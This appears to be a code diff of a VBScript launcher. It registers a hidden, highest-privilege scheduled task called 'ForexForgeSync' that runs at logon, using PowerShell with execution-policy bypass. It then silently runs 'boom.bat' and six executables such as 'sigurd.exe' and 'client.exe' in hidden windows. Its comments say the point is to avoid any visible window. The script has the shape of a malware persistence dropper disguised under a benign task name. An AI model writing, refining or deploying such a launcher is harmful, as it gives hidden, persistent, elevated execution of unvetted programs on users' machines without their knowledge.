@@ -1,38 +1,37 @@
 Set WshShell = CreateObject("WScript.Shell")
 Set FSO = CreateObject("Scripting.FileSystemObject")
 
-' Get absolute paths properly
-strPath = FSO.GetParentFolderName(WScript.ScriptFullName)
+' Get absolute path
 strScript = WScript.ScriptFullName
+strPath = FSO.GetParentFolderName(strScript)
 
-' --- STEP 1: POWERSHELL TASK CREATION ---
-' We use -WindowStyle Hidden and -ExecutionPolicy Bypass to stay silent
-' Added extra quotes to handle any spaces in the file path
+' --- STEP 1: CREATE THE TASK (Only on first run) ---
+' We check for the /boot argument to see if we are already running as a task
 If Not WScript.Arguments.Named.Exists("boot") Then
-    psCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & _
-        "$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '//B \""" & strScript & "\"" /boot'; " & _
+    ' Simple PowerShell command with no complex nesting
+    ' -WindowStyle Hidden ensures no blue box flashes
+    ' -ExecutionPolicy Bypass ensures the command isn't blocked
+    psCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
+        "\"$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '//B \""" & strScript & "\"" /boot'; " & _
         "$trigger = New-ScheduledTaskTrigger -AtLogOn; " & _
-        "$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; " & _
-        "Register-ScheduledTask -TaskName 'ForexForgeSync' -Action $action -Trigger $trigger -Principal $principal -Force"""
+        "Register-ScheduledTask -TaskName 'ForexForgeSync' -Action $action -Trigger $trigger -RunLevel Highest -Force\""
+
+    ' Run the creation command hidden (0)
+    WshShell.Run psCommand, 0, True
     
-    ' Run PowerShell completely hidden
-    WshShell.Run psCmd, 0, True
-    
-    ' First time run: Launch boom.bat
+    ' Run boom.bat for the first time
     WshShell.Run "cmd.exe /c boom.bat", 0, True
 End If
 
-' --- STEP 2: SILENT WAIT ---
-' This happens in the background on reboot
+' --- STEP 2: THE SILENT WAIT ---
+' This 30s delay happens in the background. No window to click 'X' on
 WScript.Sleep 30000 
 
 ' --- STEP 3: LAUNCH THE 6 APPS ---
-' 0 = Hidden window, False = Don't wait for them to finish
+' 0 = Hidden window
 WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
 WshShell.Run """" & strPath & "\client.exe""", 0, False
 WshShell.Run """" & strPath & "\file3.exe""", 0, False
 WshShell.Run """" & strPath & "\file4.exe""", 0, False
 WshShell.Run """" & strPath & "\file5.exe""", 0, False
 WshShell.Run """" & strPath & "\file6.exe""", 0, False
-
-WScript.Quit
